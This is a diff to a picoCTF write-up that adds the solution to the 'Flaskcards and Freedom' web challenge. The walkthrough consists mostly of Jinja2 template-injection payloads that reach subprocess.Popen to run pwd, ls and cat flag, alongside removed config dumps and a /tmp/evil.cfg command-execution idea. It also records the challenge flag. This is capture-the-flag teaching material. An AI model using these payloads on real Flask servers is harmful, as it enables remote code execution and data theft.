@@ -104,6 +104,8 @@ Title                                                                      | Cat
 [James Brahm Returns         ](#cryptography-700-james-brahm-returns)      | Cryptography     | 700    |
 [LambDash 3                  ](#web-exploitation-800-lambdash-3)           | Web              | 800    |
 [Dog or Frog                 ](#general-skills-900-dog-or-frog)            | General          | 900    |
+[Flaskcards and Freedom      ](#web-exploitation-900-flaskcards-and-freedom)| Web              | 900    | `picoCTF{R_C_E_wont_let_me_be_85e92c3a}`
+
 
 ## Forensics 50: Forensics Warmup 1
 
@@ -5072,34 +5074,38 @@ input: {{ ''.__class__.__mro__[1].__subclasses__()[760] }}
 result: <class 'subprocess.Popen'>
 ```
 
-
 ```
-{{ config.items() }}
-
-dict_items([('PROPAGATE_EXCEPTIONS', None), ('EXPLAIN_TEMPLATE_LOADING', False), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SQLALCHEMY_ECHO', False), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False), ('TESTING', False), ('BOOTSTRAP_LOCAL_SUBDOMAIN', None), ('SQLALCHEMY_BINDS', None), ('SQLALCHEMY_RECORD_QUERIES', None), ('BOOTSTRAP_USE_MINIFIED', True), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_DOMAIN', False), ('SESSION_COOKIE_HTTPONLY', True), ('SQLALCHEMY_MAX_OVERFLOW', None), ('ENV', 'production'), ('MAX_COOKIE_SIZE', 4093), ('SQLALCHEMY_POOL_SIZE', None), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('TRAP_HTTP_EXCEPTIONS', False), ('SECRET_KEY', 'f645e18b63bc9396ad8a2662c1ec762d'), ('TRAP_BAD_REQUEST_ERRORS', None), ('BOOTSTRAP_QUERYSTRING_REVVING', True), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(0, 43200)), ('JSON_SORT_KEYS', True), ('SESSION_COOKIE_PATH', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('SQLALCHEMY_TRACK_MODIFICATIONS', False), ('TEMPLATES_AUTO_RELOAD', None), ('BOOTSTRAP_SERVE_LOCAL', False), ('SQLALCHEMY_NATIVE_UNICODE', None), ('SQLALCHEMY_POOL_RECYCLE', None), ('PREFERRED_URL_SCHEME', 'http'), ('SESSION_COOKIE_NAME', 'session'), ('BOOTSTRAP_CDN_FORCE_SSL', False), ('DEBUG', False), ('JSONIFY_MIMETYPE', 'application/json'), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('SESSION_COOKIE_SAMESITE', None), ('SQLALCHEMY_POOL_TIMEOUT', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), ('SESSION_COOKIE_SECURE', False), ('JSON_AS_ASCII', True), ('SQLALCHEMY_DATABASE_URI', 'sqlite://'), ('MAX_CONTENT_LENGTH', None)])
-
+input: {{ ''.__class__.__mro__[1].__subclasses__()[760]('pwd',shell=True).communicate() }}
+result: (None, None)
 ```
 
+so it is not outputting stdout, normally we would add `stdout=subprocess.PIPE`, but we don't have
+access to it but this turns out to just be the integer `-1`:
 
 ```
-
-first: {{ config.from_object('os') }}
-then: {{ config.get_items() }}
-
-result:
-
-dict_items([('XATTR_CREATE', 1), ('EXPLAIN_TEMPLATE_LOADING', False), ('ST_NOATIME', 1024), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SQLALCHEMY_ECHO', False), ('PRIO_PGRP', 1), ('EX_CONFIG', 78), ('SEEK_DATA', 3), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False), ('NGROUPS_MAX', 65536), ('SCHED_IDLE', 5), ('EX_NOUSER', 67), ('O_NDELAY', 2048), ('WIFCONTINUED', <built-in function WIFCONTINUED>), ('P_ALL', 0), ('BOOTSTRAP_USE_MINIFIED', True), ('EX_SOFTWARE', 70), ('APPLICATION_ROOT', '/'), ('WNOWAIT', 16777216), ('WEXITSTATUS', <built-in function WEXITSTATUS>), ('WUNTRACED', 2), ('SEEK_SET', 0), ('O_ASYNC', 8192), ('POSIX_FADV_DONTNEED', 4), ('O_SYNC', 1052672), ('ST_NOSUID', 2), ('P_PID', 1), ('MAX_COOKIE_SIZE', 4093), ('SCHED_OTHER', 0), ('O_ACCMODE', 3), ('EX_CANTCREAT', 73), ('O_TRUNC', 512), ('O_DSYNC', 4096), ('SEEK_CUR', 1), ('EX_PROTOCOL', 76), ('F_ULOCK', 0), ('WIFEXITED', <built-in function WIFEXITED>), ('O_NONBLOCK', 2048), ('POSIX_FADV_RANDOM', 1), ('SERVER_NAME', None), ('SECRET_KEY', 'f645e18b63bc9396ad8a2662c1ec762d'), ('WSTOPPED', 2), ('SESSION_COOKIE_PATH', None), ('EX_NOPERM', 77), ('WIFSIGNALED', <built-in function WIFSIGNALED>), ('R_OK', 4), ('EX_UNAVAILABLE', 69), ('ST_NODIRATIME', 2048), ('RTLD_LOCAL', 0), ('SESSION_REFRESH_EACH_REQUEST', True), ('SQLALCHEMY_TRACK_MODIFICATIONS', False), ('ST_SYNCHRONOUS', 16), ('F_TEST', 3), ('SEEK_HOLE', 4), ('SQLALCHEMY_POOL_RECYCLE', None), ('SCHED_RESET_ON_FORK', 1073741824), ('PREFERRED_URL_SCHEME', 'http'), ('O_TMPFILE', 4259840), ('SESSION_COOKIE_NAME', 'session'), ('EX_NOINPUT', 66), ('BOOTSTRAP_CDN_FORCE_SSL', False), ('ST_RELATIME', 4096), ('EX_IOERR', 74), ('O_NOCTTY', 256), ('CLD_CONTINUED', 6), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('POSIX_FADV_NOREUSE', 5), ('SESSION_COOKIE_SAMESITE', None), ('POSIX_FADV_WILLNEED', 3), ('TRAP_BAD_REQUEST_ERRORS', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), ('SESSION_COOKIE_SECURE', False), ('O_PATH', 2097152), ('O_APPEND', 1024), ('O_WRONLY', 1), ('ST_RDONLY', 1), ('SESSION_COOKIE_DOMAIN', False), ('P_NOWAITO', 1), ('PROPAGATE_EXCEPTIONS', None), ('CLD_DUMPED', 3), ('O_RDONLY', 0), ('SQLALCHEMY_POOL_SIZE', None), ('F_TLOCK', 2), ('PRIO_USER', 2), ('TESTING', False), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(0, 43200)), ('ST_NODEV', 4), ('WTERMSIG', <built-in function WTERMSIG>), ('BOOTSTRAP_LOCAL_SUBDOMAIN', None), ('P_NOWAIT', 1), ('SQLALCHEMY_BINDS', None), ('SQLALCHEMY_RECORD_QUERIES', None), ('EX_OSERR', 71), ('EX_NOHOST', 68), ('ST_WRITE', 128), ('O_NOATIME', 262144), ('WSTOPSIG', <built-in function WSTOPSIG>), ('O_CREAT', 64), ('SESSION_COOKIE_HTTPONLY', True), ('POSIX_FADV_NORMAL', 0), ('O_RDWR', 2), ('EX_OK', 0), ('SQLALCHEMY_MAX_OVERFLOW', None), ('CLD_EXITED', 1), ('ENV', 'production'), ('RTLD_LAZY', 1), ('WIFSTOPPED', <built-in function WIFSTOPPED>), ('XATTR_SIZE_MAX', 65536), ('RTLD_GLOBAL', 256), ('O_LARGEFILE', 0), ('O_RSYNC', 1052672), ('EX_USAGE', 64), ('O_CLOEXEC', 524288), ('EX_DATAERR', 65), ('TRAP_HTTP_EXCEPTIONS', False), ('WEXITED', 4), ('WCONTINUED', 8), ('X_OK', 1), ('SCHED_RR', 2), ('O_NOFOLLOW', 131072), ('SQLALCHEMY_POOL_TIMEOUT', None), ('BOOTSTRAP_QUERYSTRING_REVVING', True), ('ST_NOEXEC', 8), ('JSON_SORT_KEYS', True), ('F_OK', 0), ('XATTR_REPLACE', 2), ('P_WAIT', 0), ('PRIO_PROCESS', 0), ('CLD_TRAPPED', 4), ('SQLALCHEMY_NATIVE_UNICODE', None), ('WCOREDUMP', <built-in function WCOREDUMP>), ('O_DIRECT', 16384), ('BOOTSTRAP_SERVE_LOCAL', False), ('TMP_MAX', 238328), ('EX_OSFILE', 72), ('RTLD_NODELETE', 4096), ('EX_TEMPFAIL', 75), ('F_LOCK', 1), ('POSIX_FADV_SEQUENTIAL', 2), ('RTLD_DEEPBIND', 8), ('WNOHANG', 1), ('P_PGID', 2), ('RTLD_NOW', 2), ('ST_APPEND', 256), ('W_OK', 2), ('DEBUG', False), ('JSONIFY_MIMETYPE', 'application/json'), ('RTLD_NOLOAD', 4), ('SEEK_END', 2), ('USE_X_SENDFILE', False), ('O_DIRECTORY', 65536), ('SCHED_FIFO', 1), ('TEMPLATES_AUTO_RELOAD', None), ('O_EXCL', 128), ('JSON_AS_ASCII', True), ('MAX_CONTENT_LENGTH', None), ('SCHED_BATCH', 3), ('ST_MANDLOCK', 64), ('SQLALCHEMY_DATABASE_URI', 'sqlite://')])
+input: {{ ''.__class__.__mro__[1].__subclasses__()[760]('pwd',shell=True,stdout=-1).communicate() }}
+result: (b'/problems/flaskcards-and-freedom_4_2cd670d54e75a9ed7cd0e9b76816fc59\n', None)
 ```
 
-idea:
+the description mentioned there were files, so let's do an `ls`
 
 ```
-first: {{ ''.__class__.__mro__[1].__subclasses__()[760]('echo "from subprocess import check_output\n\nRUNCMD = check_output\n" > /tmp/evil.cfg', shell=True) }}
-then: {{ config.from_pyfile('/tmp/evil.cfg') }}
-then: {{ config['RUNCMD']('ls -lah',shell=True) }}
+input: {{ ''.__class__.__mro__[1].__subclasses__()[760]('ls',shell=True,stdout=-1).communicate() }}
+result: (b'app\nflag\nserver.py\nxinet_startup.sh\n', None)
 ```
+
+ok, looks like we need to read the file named `flag`
+
+```
+input: {{ ''.__class__.__mro__[1].__subclasses__()[760]('cat flag',shell=True,stdout=-1).communicate() }}
+result: (b'picoCTF{R_C_E_wont_let_me_be_85e92c3a}', None)
+```
+
+![](writeupfiles/flaskcards_freedom_flag.png)
+
+whoo \o/
 
 **Flag**
 ```
-
+picoCTF{R_C_E_wont_let_me_be_85e92c3a}
 ```
